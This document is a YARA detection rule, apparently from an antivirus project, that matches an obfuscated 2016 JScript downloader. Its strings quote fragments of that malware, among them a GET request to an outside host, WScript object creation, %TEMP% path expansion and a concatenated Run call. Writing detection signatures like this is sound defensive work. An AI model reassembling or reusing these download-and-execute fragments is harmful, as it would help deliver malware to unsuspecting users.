rule sig_20160502_a20c8a3c8eee1383cf11cb0a9ab96292 {
  meta:
    description = "datamaliciousorder - file 20160502_a20c8a3c8eee1383cf11cb0a9ab96292.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b025d427983c08d0dbfafcb181a30c953894f6fa43b9d90b54d34322f83dd92"

  strings:
    $s1  = "KmaBjhNcrGbyFrfUixVnt[ObaQoyJsaXcmJdsEsxXjb](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function KhnUlgAiuWhxMsdZuhQtf() {return ZgaIgkMmjTpdSrmCsgAsp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function FltRskRamOnaZmvMmnBbm(OwdDjfNocPzjApuOzkKzp){ZgaIgkMmjTpdSrmCsgAsp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function FltRskRamOnaZmvMmnBbm(OwdDjfNocPzjApuOzkKzp){ZgaIgkMmjTpdSrmCsgAsp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return YfeQjtEynKmkAaxRauFgu - WutRodZpkOurQtfDldEol;};" fullword ascii
    $s6  = "var ZgaIgkMmjTpdSrmCsgAsp = function BqcZgnRdoEntPruLtbRcu() {return LdfLfoGcuQlnPhtMgnIki[FvjQagRfqInlYveGbdMah](\"WScript\"+\"" ascii
    $s7  = "function OumIxgExsYecWbzFzxNle(YfeQjtEynKmkAaxRauFgu, WutRodZpkOurQtfDldEol){PjfMgyTrjBhdGexWsnViq = PjfMgyTrjBhdGexWsnViq * 1; " ascii
    $s8  = "var ZgaIgkMmjTpdSrmCsgAsp = function BqcZgnRdoEntPruLtbRcu() {return LdfLfoGcuQlnPhtMgnIki[FvjQagRfqInlYveGbdMah](\"WScript\"+\"" ascii
    $s9  = "var LdfLfoGcuQlnPhtMgnIki = this[\"WScript\"];" fullword ascii
    $s10 = "function KhnUlgAiuWhxMsdZuhQtf() {return ZgaIgkMmjTpdSrmCsgAsp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function OumIxgExsYecWbzFzxNle(YfeQjtEynKmkAaxRauFgu, WutRodZpkOurQtfDldEol){PjfMgyTrjBhdGexWsnViq = PjfMgyTrjBhdGexWsnViq * 1; " ascii
    $s12 = "function RzgPuoPilCebSuxOojAbm(){return EhhTedDshNmuJoqOuxGuu + \"\";};" fullword ascii
    $s13 = "if (KmaBjhNcrGbyFrfUixVnt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function NggUseXrbEwoJxhSybArq(WbkXzjKxeUcsNegTdrDcz) {var JthAfyGctGdfZauWkbVyy = (1, 2, 3, 4, 5, WbkXzjKxeUcsNegTdrDcz); retur" ascii
    $s15 = "function NggUseXrbEwoJxhSybArq(WbkXzjKxeUcsNegTdrDcz) {var JthAfyGctGdfZauWkbVyy = (1, 2, 3, 4, 5, WbkXzjKxeUcsNegTdrDcz); retur" ascii
    $s16 = "var SmnTazXysMhpDpxJpyBgi = false;" fullword ascii
    $s17 = "function OscXfqBauQpsDhgPkxYpb()" fullword ascii
    $s18 = "function BvtWanBduRmcKqyTtjVpf(){return FvjQagRfqInlYveGbdMah;};" fullword ascii
    $s19 = "}while (GqnRpfWmxUrqFhwBjvUmd);" fullword ascii
    $s20 = "WggUgxBduMetLmqIumAlw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}